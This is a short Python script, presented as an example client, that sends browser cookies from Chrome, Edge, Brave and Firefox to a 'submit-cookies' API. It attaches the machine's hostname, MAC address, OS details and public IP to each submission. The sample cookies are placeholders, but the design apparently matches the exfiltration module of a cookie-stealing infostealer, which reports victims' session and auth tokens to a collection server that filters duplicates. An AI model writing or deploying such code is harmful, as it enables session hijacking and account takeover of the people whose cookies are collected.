"""
Example Python client script to submit browser cookies to the API.
This script demonstrates how to send cookie data from a client to the server.
"""

import json
import requests
from datetime import datetime
import socket
import platform
import uuid

def get_device_info():
    """Get device information."""
    return {
        "os_system": platform.system(),
        "os_release": platform.release(),
        "os_version": platform.version(),
        "architecture": platform.machine(),
        "hostname": socket.gethostname(),
        "mac_address": ':'.join(['{:02x}'.format((uuid.getnode() >> ele) & 0xff) 
                                 for ele in range(0,8*6,8)][::-1]),
        "processor": platform.processor()
    }

def get_public_ip():
    """Get public IP address."""
    try:
        response = requests.get('https://api.ipify.org?format=json', timeout=5)
        return response.json()['ip']
    except:
        return "0.0.0.0"

def submit_cookies(api_url, cookies_data):
    """
    Submit cookies to the API.
    
    Args:
        api_url: The API endpoint URL (e.g., 'http://localhost:3001/api/submit-cookies')
        cookies_data: Dictionary containing browser cookies
    """
    payload = {
        "timestamp": datetime.now().isoformat(),
        "public_ip": get_public_ip(),
        "device_info": get_device_info(),
        "cookies": cookies_data
    }
    
    try:
        response = requests.post(
            api_url,
            json=payload,
            headers={'Content-Type': 'application/json'},
            timeout=10
        )
        
        if response.status_code in [200, 201]:
            result = response.json()
            if result.get('isDuplicate'):
                print("✓ Duplicate submission detected, skipped")
            else:
                print(f"✓ Cookies submitted successfully! ID: {result.get('id')}")
        else:
            print(f"✗ Failed to submit cookies: {response.status_code}")
            print(f"  Error: {response.text}")
    except Exception as e:
        print(f"✗ Error submitting cookies: {str(e)}")

if __name__ == "__main__":
    # Example usage
    API_URL = "http://localhost:3001/api/submit-cookies"
    
    # Example cookies data structure
    example_cookies = {
        "chrome": [
            {
                "name": "session_id",
                "value": "abc123xyz789",
                "domain": ".example.com",
                "path": "/",
                "expires": "2024-12-31T23:59:59Z",
                "secure": True,
                "http_only": True
            },
            {
                "name": "user_token",
                "value": "token_value_here",
                "domain": ".google.com",
                "path": "/",
                "expires": "2024-12-31T23:59:59Z",
                "secure": True,
                "http_only": False
            }
        ],
        "edge": [
            {
                "name": "edge_session",
                "value": "edge_token",
                "domain": ".microsoft.com",
                "path": "/",
                "secure": True,
                "http_only": True
            }
        ],
        "brave": [],
        "firefox": [
            {
                "name": "ff_pref",
                "value": "firefox_value",
                "domain": ".mozilla.org",
                "path": "/",
                "secure": True,
                "http_only": False
            }
        ]
    }
    
    print("Submitting cookies to API...")
    print(f"API URL: {API_URL}")
    print(f"Device: {get_device_info()['hostname']}")
    print(f"Public IP: {get_public_ip()}")
    print()
    
    submit_cookies(API_URL, example_cookies)
